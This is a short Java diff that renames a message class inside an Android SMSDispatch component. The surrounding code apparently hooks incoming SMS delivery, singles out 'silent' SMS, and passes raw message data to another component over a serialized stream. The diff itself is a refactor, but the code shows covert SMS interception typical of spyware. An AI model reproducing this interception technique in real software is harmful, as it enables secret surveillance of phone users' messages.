@@ -24,7 +24,7 @@ import android.util.Log;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.util.Check;
-import com.android.dvci.util.LowEventHandlerDefs;
+import com.android.dvci.util.LowEventMsg;
 import com.android.dvci.util.Reflect;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
@@ -120,9 +120,9 @@ public class SMSDispatch {
 				try {
 					SmsMessage sms = SmsMessage.createFromPdu(hexStringToBytes(ret));
 					if (sms.getProtocolIdentifier() == 64) {
-						LowEventHandlerDefs obj = new LowEventHandlerDefs();
+						LowEventMsg obj = new LowEventMsg();
 						obj.data = sms.getPdu();
-						obj.type = LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT;
+						obj.type = LowEventMsg.EVENT_TYPE_SMS_SILENT;
 						obj = sendSerialObj(obj);
 						if (obj != null) {
 							return obj.res;
@@ -177,9 +177,9 @@ public class SMSDispatch {
 			}
 			return callOrig;
 		}
-		LowEventHandlerDefs obj = new LowEventHandlerDefs();
+		LowEventMsg obj = new LowEventMsg();
 		obj.data = pdus[0];
-		obj.type = LowEventHandlerDefs.EVENT_TYPE_SMS;
+		obj.type = LowEventMsg.EVENT_TYPE_SMS;
 		obj = sendSerialObj(obj);
 		if (obj != null) {
 			return obj.res;
@@ -187,7 +187,7 @@ public class SMSDispatch {
 		return callOrig;
 	}
 
-	private static LowEventHandlerDefs sendSerialObj(LowEventHandlerDefs obj) {
+	private static LowEventMsg sendSerialObj(LowEventMsg obj) {
 		if (obj == null) {
 			return null;
 		}
@@ -244,7 +244,7 @@ public class SMSDispatch {
 							if (available > 0) {
 
 								ObjectInputStream ois = new ObjectInputStream(streamIn);
-								obj = (LowEventHandlerDefs) ois.readObject();
+								obj = (LowEventMsg) ois.readObject();
 								if (Cfg.DEBUG) {
 									Check.log(TAG +" GOT DATA " + obj);
 								}
